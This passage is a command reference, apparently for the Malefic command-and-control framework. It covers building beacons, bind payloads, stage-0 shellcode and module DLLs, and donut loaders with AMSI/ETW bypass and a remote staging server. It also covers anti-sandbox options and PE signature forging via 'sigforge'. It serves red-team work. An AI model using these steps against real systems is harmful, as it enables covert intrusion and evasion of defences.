artifact download MAGIC_TOOL
~~~

**SEE ALSO**

* [artifact](#artifact)	 - Manage build artifacts

#### artifact show

Show artifact metadata and profile

```
artifact show [flags]
```

**Examples**

~~~
artifact show artifact_name

artifact show artifact_name --profile
~~~

**Options**

```
      --profile   show profile
```

**SEE ALSO**

* [artifact](#artifact)	 - Manage build artifacts

#### artifact upload

Upload a build output file to the server

**Description**

Upload a custom artifact to the server for storage or further use.



```
artifact upload [flags]
```

**Examples**

~~~
// Upload an artifact with default settings
artifact upload /path/to/artifact

// Upload an artifact with a specific stage and alias name
artifact upload /path/to/artifact --comment production --name my_artifact

// Upload an artifact and specify its type
artifact upload /path/to/artifact --type DLL
~~~

**Options**

```
  -c, --comment string   comment for artifact
  -n, --name string      alias name
      --target string    rust target
  -t, --type string      Set type
```

**SEE ALSO**

* [artifact](#artifact)	 - Manage build artifacts

### build

Build implants and modules

**Description**

Build beacons, bind payloads, preludes, modules, and stage-0 artifacts.

**Options**

```
      --auto-download   auto download artifact
```

**SEE ALSO**

* [build beacon](#build-beacon)	 - Build a beacon
* [build bind](#build-bind)	 - Build a bind payload
* [build log](#build-log)	 - Show build log
* [build modules](#build-modules)	 - Compile specified modules into DLLs
* [build prelude](#build-prelude)	 - Build a prelude payload
* [build pulse](#build-pulse)	 - Build a stage-0 shellcode payload

#### build beacon

Build a beacon

**Description**

Generate a beacon artifact based on the specified profile.


```
build beacon [flags]
```

**Examples**

~~~
// Build a beacon
build beacon --addresses "https://127.0.0.1:443" --target x86_64-pc-windows-gnu --source docker

// Specify a module
build beacon --addresses "https://127.0.0.1:443,https://10.0.0.1:443" --target x86_64-pc-windows-gnu --modules nano --source docker

// Build a beacon with custom rem
build beacon --addresses "tcp://127.0.0.1:5001" --rem "tcp://nonenonenonenone:@127.0.0.1:12345?wrapper=qu7tnG..." --target x86_64-pc-windows-gnu --source action

// Build a beacon with a profile
build beacon --profile tcp_default --target x86_64-pc-windows-gnu

// Build a beacon from archive (zip containing implant.yaml + prelude.yaml + resources/)
build beacon --archive-path /path/to/build.zip --target x86_64-pc-windows-gnu

// Build a beacon with individual config files
build beacon --implant-path /path/to/implant.yaml --prelude-path /path/to/prelude.yaml --target x86_64-pc-windows-gnu

// Build a beacon by saas
build beacon --profile tcp_default --target x86_64-pc-windows-gnu --source saas

// Build by GithubAction
build beacon --profile tcp_default --target x86_64-pc-windows-gnu --source action

// Use interactive wizard mode
build beacon --wizard
~~~

**Options**

```
      --3rd string                      Override 3rd party modules
      --addresses string                Target addresses (comma-separated)
      --anti-sandbox                    Enable anti-sandbox detection
      --archive-path string             path to build archive (zip)
      --artifact-id uint32              Artifact ID for pulse builds
      --auto-download                   Auto download artifact after build
      --comment string                  comment for this build
      --cron string                     cron expr (e.g., '*/5 * * * * * *')
      --encryption string               encryption type (aes, xor, etc.)
      --github-owner string             github owner
      --github-remove                   remove workflow
      --github-repo string              github repo
      --github-token string             github token
      --github-workflowFile string      github workflow file
      --guardrail-domains string        domain whitelist (comma-separated)
      --guardrail-ip-addresses string   IP address whitelist (comma-separated)
      --guardrail-server-names string   server name whitelist (comma-separated)
      --guardrail-usernames string      username whitelist (comma-separated)
      --implant-path string             path to implant.yaml file
      --jitter float                    jitter value (0.0-1.0) (default -1)
      --keepalive                       keepalive mode
      --key string                      encryption key
      --lib                             build shared library instead of executable
      --max-cycles int                  max cycles, -1 for infinite (default -1)
      --modules string                  Override modules (comma-separated, e.g., 'full,execute_exe')
      --name string                     profile name
      --ollvm                           Enable Ollvm
      --prelude-path string             path to prelude.yaml file
      --profile string                  profile name
      --proxy-url string                proxy URL
      --proxy-use-env                   Use environment proxy settings
      --rem string                      REM pipeline name or direct link address (e.g., rem_default or tcp://cdn:5555)
      --resources-path string           path to resources directory
      --retry int                       retry count (default -1)
      --secure                          Enable secure communication
      --source string                   build source: docker, action, saas, patch
      --target string                   build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.
      --wizard                          Start interactive wizard mode
```

**SEE ALSO**

* [build](#build)	 - Build implants and modules

#### build bind

Build a bind payload

**Description**

Generate a bind payload that connects a client to the server.

```
build bind [flags]
```

**Examples**

~~~
// Build a bind payload
build bind --target x86_64-pc-windows-gnu --addresses tcp://127.0.0.1:5008

// Build a bind payload with additional modules
build bind --target x86_64-pc-windows-gnu --addresses 127.0.0.1:5008 --modules base,sys_full

// Build a bind payload with a profile
build bind --target x86_64-pc-windows-gnu --profile tcp_default

// Build a bind payload by saas 
build bind --target x86_64-pc-windows-gnu --addresses 127.0.0.1:5008 --source saas
~~~

**Options**

```
      --3rd string                      Override 3rd party modules
      --addresses string                Target addresses (comma-separated)
      --anti-sandbox                    Enable anti-sandbox detection
      --archive-path string             path to build archive (zip)
      --artifact-id uint32              Artifact ID for pulse builds
      --auto-download                   Auto download artifact after build
      --comment string                  comment for this build
      --cron string                     cron expr (e.g., '*/5 * * * * * *')
      --encryption string               encryption type (aes, xor, etc.)
      --github-owner string             github owner
      --github-remove                   remove workflow
      --github-repo string              github repo
      --github-token string             github token
      --github-workflowFile string      github workflow file
      --guardrail-domains string        domain whitelist (comma-separated)
      --guardrail-ip-addresses string   IP address whitelist (comma-separated)
      --guardrail-server-names string   server name whitelist (comma-separated)
      --guardrail-usernames string      username whitelist (comma-separated)
      --implant-path string             path to implant.yaml file
      --jitter float                    jitter value (0.0-1.0) (default -1)
      --keepalive                       keepalive mode
      --key string                      encryption key
      --lib                             build shared library instead of executable
      --max-cycles int                  max cycles, -1 for infinite (default -1)
      --modules string                  Override modules (comma-separated, e.g., 'full,execute_exe')
      --name string                     profile name
      --ollvm                           Enable Ollvm
      --prelude-path string             path to prelude.yaml file
      --profile string                  profile name
      --proxy-url string                proxy URL
      --proxy-use-env                   Use environment proxy settings
      --rem string                      REM pipeline name or direct link address (e.g., rem_default or tcp://cdn:5555)
      --resources-path string           path to resources directory
      --retry int                       retry count (default -1)
      --secure                          Enable secure communication
      --source string                   build source: docker, action, saas, patch
      --target string                   build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.
      --wizard                          Start interactive wizard mode
```

**SEE ALSO**

* [build](#build)	 - Build implants and modules

#### build log

Show build log

**Description**

Displays the log for the specified number of rows

```
build log [flags]
```

**Examples**


~~~
build log artifact_name --limit 70
~~~


**Options**

```
      --limit int   limit of rows (default 50)
```

**Options inherited from parent commands**

```
      --auto-download   auto download artifact
```

**SEE ALSO**

* [build](#build)	 - Build implants and modules

#### build modules

Compile specified modules into DLLs

**Description**

Compile the specified modules into DLL files for deployment or integration.


```
build modules [flags]
```

**Examples**

~~~
// Compile all modules for the Windows platform
build modules --target x86_64-pc-windows-gnu --modules nano

// Compile a predefined feature set of modules (nano)
build modules --target x86_64-pc-windows-gnu --profile tcp_default --modules nano

// Compile specific modules into DLLs
build modules --target x86_64-pc-windows-gnu --profile tcp_default --modules base,execute_dll

// Compile third party module(curl, rem)
build modules --3rd rem --target x86_64-pc-windows-gnu --profile tcp_default

// Compile module by saas
build modules --target x86_64-pc-windows-gnu --profile tcp_default --source saas
~~~

**Options**

```
      --3rd string                   Override 3rd party modules
      --comment string               comment for this build
      --github-owner string          github owner
      --github-remove                remove workflow
      --github-repo string           github repo
      --github-token string          github token
      --github-workflowFile string   github workflow file
      --lib                          build shared library instead of executable
      --modules string               Override modules (comma-separated, e.g., 'full,execute_exe')
      --profile string               profile name
      --source string                build source: docker, action, saas, patch
      --target string                build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.
      --wizard                       Start interactive wizard mode
```

**Options inherited from parent commands**

```
      --auto-download   auto download artifact
```

**SEE ALSO**

* [build](#build)	 - Build implants and modules

#### build prelude

Build a prelude payload

**Description**

Generate a prelude payload as part of a multi-stage deployment.
	

```
build prelude [flags]
```

**Examples**

~~~
// Build a prelude payload from archive
build prelude --target x86_64-pc-windows-gnu --archive-path /path/to/build.zip

// Build a prelude payload from individual files
build prelude --target x86_64-pc-windows-gnu --prelude-path /path/to/prelude.yaml --resources-path /path/to/resources/

// Build a prelude payload from profile
build prelude --target x86_64-pc-windows-gnu --profile my_profile

// Build a prelude payload by docker
build prelude --target x86_64-pc-windows-gnu --archive-path /path/to/build.zip --source docker

// Build a prelude payload by saas
build prelude --target x86_64-pc-windows-gnu --profile my_profile --source saas
~~~

**Options**

```
      --archive-path string          path to build archive (zip)
      --comment string               comment for this build
      --github-owner string          github owner
      --github-remove                remove workflow
      --github-repo string           github repo
      --github-token string          github token
      --github-workflowFile string   github workflow file
      --lib                          build shared library instead of executable
      --prelude-path string          path to prelude.yaml file
      --profile string               profile name
      --resources-path string        path to resources directory
      --source string                build source: docker, action, saas, patch
      --target string                build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.
      --wizard                       Start interactive wizard mode
```

**Options inherited from parent commands**

```
      --auto-download   auto download artifact
```

**SEE ALSO**

* [build](#build)	 - Build implants and modules

#### build pulse

Build a stage-0 shellcode payload

**Description**

Generate 'pulse' payload,a minimized shellcode template, corresponding to CS artifact, very suitable for loading by various loaders


```
build pulse [flags]
```

**Examples**


~~~
// Build a pulse payload
build pulse --target x86_64-pc-windows-gnu --profile tcp_default

// Build a pulse payload by specifying pulse artifact id
build pulse --target x86_64-pc-windows-gnu --profile tcp_default --artifact-id 1

// Build a pulse payload and point to a beacon artifact for relink
build pulse --target x86_64-pc-windows-gnu --profile tcp_default --artifact-id 1 --beacon-artifact-id 42
~~~


**Options**

```
      --address string               Only support single address
      --artifact-id uint32           pulse artifact id
      --beacon-artifact-id uint32    beacon artifact id used by pulse relink
      --comment string               comment for this build
      --github-owner string          github owner
      --github-remove                remove workflow
      --github-repo string           github repo
      --github-token string          github token
      --github-workflowFile string   github workflow file
      --implant-path string          path to implant.yaml file
      --lib                          build shared library instead of executable
      --path string                   (default "/pulse")
      --profile string               profile name
      --shellcode                    Build pulse as raw shellcode (.bin)
      --source string                build source: docker, action, saas, patch
      --target string                build target, specify the target arch and platform, such as  **x86_64-pc-windows-gnu**.
      --user-agent string            HTTP User-Agent string
      --wizard                       Start interactive wizard mode
```

**Options inherited from parent commands**

```
      --auto-download   auto download artifact
```

**SEE ALSO**

* [build](#build)	 - Build implants and modules

### profile

Manage build profiles

**Description**

Create, load, inspect, and delete build profiles.

```
profile
```

**SEE ALSO**

* [profile delete](#profile-delete)	 - Delete a build profile from the server
* [profile list](#profile-list)	 - List build profiles
* [profile load](#profile-load)	 - Load an existing implant profile
* [profile new](#profile-new)	 - Create a build profile from defaults
* [profile show](#profile-show)	 - Show detailed profile information

#### profile delete

Delete a build profile from the server

```
profile delete
```

**Examples**


~~~
profile delete profile_name
~~~


**SEE ALSO**

* [profile](#profile)	 - Manage build profiles

#### profile list

List build profiles

```
profile list
```

**Examples**

~~~
// List all compile profiles
profile list
~~~

**SEE ALSO**

* [profile](#profile)	 - Manage build profiles

#### profile load

Load an existing implant profile

**Description**


The **profile load** command requires a valid configuration file path (e.g., **config.yaml** ) to load settings. This file specifies attributes necessary for generating the compile profile.


```
profile load [flags]
```

**Examples**

~~~
// Create a new profile using network configuration in pipeline
profile load /path/to/config.yaml --name my_profile --pipeline pipeline_name

// Create a new profile with external file
profile load /path/to/profile.zip --name my_profile --pipeline pipeline_name
~~~

**Options**

```
  -n, --name string       Overwrite profile name
  -p, --pipeline string   Overwrite profile basic pipeline_id
      --rem string        rem pipeline id
```

**SEE ALSO**

* [profile](#profile)	 - Manage build profiles

#### profile new

Create a build profile from defaults

```
profile new [flags]
```

**Examples**


~~~
// create a default profile for <tcp/http pipeline>
profile new --name tcp_profile_demo --pipeline tcp_default

// create a default profile for rem
profile new --name rem_profile_demo --pipeline tcp_default --rem rem_default
~~~


**Options**

```
  -n, --name string       Overwrite profile name
  -p, --pipeline string   Overwrite profile basic pipeline_id
      --rem string        rem pipeline id
```

**SEE ALSO**

* [profile](#profile)	 - Manage build profiles

#### profile show

Show detailed profile information

**Description**

Display a profile's metadata, implant.yaml, prelude.yaml, and resources list.

```
profile show
```

**Examples**

~~~
// Show detailed information for a profile
profile show my_profile
~~~

**SEE ALSO**

* [profile](#profile)	 - Manage build profiles

### donut

donut cmd

**Description**

Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory 

```
donut [flags]
```

**Examples**


  donut -i c2.dll
  donut --arch x86 --class TestClass --method RunProcess --args notepad.exe --input loader.dll
  donut -i loader.dll -c TestClass -m RunProcess -p "calc notepad" -s http://remote_server.com/modules/
  donut -z2 -k2 -t -i loader.exe -o out.bin


**Options**

```
  -a, --arch int          Target architecture:
                          	1=x86
                          	2=amd64
                          	3=x86+amd64
                          	 (default 3)
  -p, --args string       Optional parameters/command line inside quotations for DLL method/function or EXE.
  -b, --bypass uint32     Bypass AMSI/WLDP/ETW:
                          	1=None
                          	2=Abort on fail
                          	3=Continue on fail
                          	 (default 3)
  -c, --class string      Optional class name. (required for .NET DLL, format: namespace.class)
  -z, --compress uint32   Pack/Compress file:
                          	1=None
                          	2=aPLib         [experimental]
                          	3=LZNT1  (RTL)  [experimental, Windows only]
                          	4=Xpress (RTL)  [experimental, Windows only]
                          	5=LZNT1         [experimental]
                          	6=Xpress        [experimental, recommended]
                          	 (default 1)
  -j, --decoy string      Optional path of decoy module for Module Overloading.
  -d, --domain string     AppDomain name to create for .NET assembly. If entropy is enabled, this is generated randomly.
  -e, --entropy uint32    Entropy:
                          	1=None
                          	2=Use random names
                          	3=Random names + symmetric encryption
                          	 (default 3)
  -x, --exit uint32       Exit behaviour:
                          	1=Exit thread
                          	2=Exit process
                          	3=Do not exit or cleanup and block indefinitely
                          	 (default 1)
  -f, --format int        Output format:
                          	1=Binary
                          	2=Base64
                          	3=C
                          	4=Ruby
                          	5=Python
                          	6=Powershell
                          	7=C#
                          	8=Hex
                          	9=UUID
                          	10=Golang
                          	11=Rust
                          	 (default 1)
  -k, --headers uint32    Preserve PE headers:
                          	1=Overwrite
                          	2=Keep all
                          	 (default 1)
  -i, --input string      Input file to execute in-memory.
  -m, --method string     Optional method or function for DLL. (a method is required for .NET DLL)
  -n, --modname string    Module name for HTTP staging. If entropy is enabled, this is generated randomly.
  -y, --oep uint32        Create thread for loader and continue execution at <addr> supplied. (eg. 0x1234)
  -o, --output string     Output file to save loader. (default "shellcode")
  -r, --runtime string    CLR runtime version. MetaHeader used by default or v4.0.30319 if none available.
  -s, --server string     Server that will host the Donut module. Credentials may be provided in the following format: https://username:password@192.168.0.1/
  -t, --thread            Execute the entrypoint of an unmanaged EXE as a thread.
  -w, --unicode           Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
  -v, --verbose           verbose output
      --wizard            Start interactive wizard mode
```

### mutant

Malefic-mutant tools for PE/DLL manipulation

**Description**

Tools for converting DLL to shellcode, stripping binaries, and PE signature manipulation

```
mutant
```

**SEE ALSO**

* [mutant sigforge](#mutant-sigforge)	 - PE file signature manipulation tool
* [mutant srdi](#mutant-srdi)	 - Convert DLL to shellcode using SRDI
* [mutant strip](#mutant-strip)	 - Strip paths from binary files

#### mutant sigforge

PE file signature manipulation tool

**Description**

Extract, copy, inject, remove, or check PE file signatures

```
mutant sigforge [flags]
```

**Examples**


  mutant sigforge --operation extract --source signed.exe --output signature.bin
  mutant sigforge --operation copy --source signed.exe --target unsigned.exe --output result.exe
  mutant sigforge --operation inject --source unsigned.exe --signature signature.bin --output signed.exe
  mutant sigforge --operation remove --source signed.exe --output unsigned.exe
  mutant sigforge --operation check --source target.exe


**Options**

```
      --operation string   Operation: extract, copy, inject, remove, or check
  -o, --output string      Output file path
      --signature string   Signature file (for inject operation)
  -s, --source string      Source PE file
  -t, --target string      Target PE file (for copy operation)
      --wizard             Start interactive wizard mode
```

**SEE ALSO**

* [mutant](#mutant)	 - Malefic-mutant tools for PE/DLL manipulation

#### mutant srdi

Convert DLL to shellcode using SRDI

**Description**

Generate SRDI shellcode from DLL files with support for TLS

```
mutant srdi [flags]
```

**Examples**


  mutant srdi -i beacon.dll -o beacon.bin
  mutant srdi -i beacon.dll -a x64 --function-name ReflectiveLoader
  mutant srdi -i beacon.dll -t malefic --userdata-path userdata.bin


**Options**

```
  -a, --arch string            Architecture: x86 or x64 (default "x64")
      --function-name string   Function name
  -i, --input string           Source DLL file path
  -o, --output string          Target shellcode path (default: <input>.bin)
  -p, --platform string        Platform: win (default "win")
  -t, --type string            SRDI type: link (no TLS) or malefic (with TLS) (default "malefic")
      --userdata-path string   User data file path
      --wizard                 Start interactive wizard mode
```

**SEE ALSO**

* [mutant](#mutant)	 - Malefic-mutant tools for PE/DLL manipulation

#### mutant strip

Strip paths from binary files

**Description**

Remove build paths and other sensitive information from binary files

```
mutant strip [flags]
```

**Examples**


  mutant strip -i malefic.exe -o malefic-stripped.exe
  mutant strip -i malefic.exe --custom-paths /home/user,/opt/build


**Options**

```
      --custom-paths string   Additional custom paths to replace (comma separated)
  -i, --input string          Source binary file path
  -o, --output string         Output binary file path (default: <input>.stripped)
      --wizard                Start interactive wizard mode
```

**SEE ALSO**

* [mutant](#mutant)	 - Malefic-mutant tools for PE/DLL manipulation

